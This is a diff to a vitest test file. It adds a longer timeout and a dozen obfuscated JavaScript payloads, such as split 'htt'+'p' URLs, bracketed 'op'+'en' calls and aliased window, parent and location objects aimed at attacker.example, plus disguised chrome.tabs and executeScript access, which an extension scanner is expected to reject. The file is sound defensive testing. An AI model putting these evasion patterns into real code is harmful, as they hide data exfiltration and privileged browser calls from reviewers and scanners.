@@ -13,7 +13,9 @@ import {
 } from 'node:fs';
 import { resolve } from 'node:path';
 import { inflateRawSync, crc32 } from 'node:zlib';
-import { afterEach, describe, expect, it } from 'vitest';
+import { afterEach, describe, expect, it, vi } from 'vitest';
+
+vi.setConfig({ testTimeout: 180_000 });
 
 const repositoryRoot = resolve(import.meta.dirname, '../..');
 const extensionRoot = resolve(repositoryRoot, 'extension');
@@ -352,6 +354,18 @@ describe('deterministic production-disabled candidate pipeline', () => {
       ['const _t=chrome.tabs;_t.captureVisibleTab();', 'chrome-api-allowlist'],
       ['const _u="https://attacker.example/bare-url";', 'network-deny'],
       ['const _o=open;_o("https://attacker.example/");', 'network-deny'],
+      ['document.defaultView.open("htt"+"p://attacker.example/?d=x");', 'network-deny'],
+      ['top.open("htt"+"p://attacker.example/");', 'network-deny'],
+      ['parent.open("htt"+"p://attacker.example/");', 'network-deny'],
+      ['window["op"+"en"]("htt"+"p://attacker.example/");', 'javascript-authority-closure'],
+      ['const w=window;w.open("htt"+"p://attacker.example/");', 'javascript-authority-closure'],
+      ['window.location["href"]="htt"+"p://attacker.example/";', 'network-deny'],
+      ['const l=window.location;l.href="//attacker.example/";', 'network-deny'],
+      ['const t=chrome["ta"+"bs"];', 'javascript-authority-closure'],
+      ['chrome["scripting"]["executeScript"]({});', 'javascript-authority-closure'],
+      ['const g=globalThis;', 'javascript-authority-closure'],
+      ['const w=window;w["op"+"en"]("x");', 'javascript-authority-closure'],
+      ['const p=parent;p.open("x");', 'javascript-authority-closure'],
     ];
     try {
       for (const [payload, expectedCheck] of payloads) {
